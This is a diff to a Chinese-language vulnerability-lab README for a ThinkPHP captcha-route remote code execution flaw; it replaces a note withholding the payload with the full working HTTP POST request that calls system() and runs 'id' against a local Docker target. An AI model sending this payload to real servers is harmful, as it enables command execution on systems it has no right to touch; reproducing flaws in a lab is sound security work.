@@ -18,6 +18,22 @@ docker-compose up -d
 
 ## 漏洞复现
 
-发送数据包`****`（考虑影响，暂不公开，知道Payload的同学可以自己测试）：
+发送数据包：
+
+```
+POST /index.php?s=captcha HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
+```
+
+成功执行`id`命令：
 
 ![](1.png)
